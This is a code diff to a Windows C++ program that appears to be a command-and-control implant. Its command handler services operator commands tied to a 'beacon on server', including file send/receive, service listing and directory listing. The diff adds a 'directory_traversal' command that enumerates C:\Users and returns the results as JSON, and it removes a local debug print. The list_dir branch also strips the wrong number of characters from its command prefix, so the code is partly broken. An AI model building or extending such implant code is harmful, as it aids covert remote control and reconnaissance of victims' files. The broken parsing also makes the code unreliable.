@@ -10,6 +10,9 @@
 #include <vector>
 #include <cstdio>
 #include <tlhelp32.h>
+#include <json/json.h>  // Include jsoncpp header
+
+#include "directory_traversal.h"
 
 
 #pragma comment(lib, "iphlpapi.lib")
@@ -160,6 +163,11 @@ std::string command_handler(const std::string& command, const std::string& uuid)
         return output;
     } else if (command == "checkfiles") {
     } else if (command == "send_file") {
+    } else if (command == "directory_traversal") {
+        Json::Value result;
+        getDirectoryContents("C:\\Users", result);
+        std::string output = result.toStyledString();
+        return output;
     } else if (command == "recv_file") {
     } else if (command == "list_services") {
     } else if (command == "disk_usage") {
@@ -167,7 +175,6 @@ std::string command_handler(const std::string& command, const std::string& uuid)
     } else if (command.rfind("list_dir", 0) == 0) { // need to check if it starts with shell, limitation of current beacon on server
         std::string shell_command = command.substr(6); // Get the command after "shell "
         std::string output = listDirectory(shell_command.c_str());
-        std::cout << "Shell command output: " << output << std::endl;
         return output;
     } else {
         std::cerr << "Unknown command: " << command << std::endl;
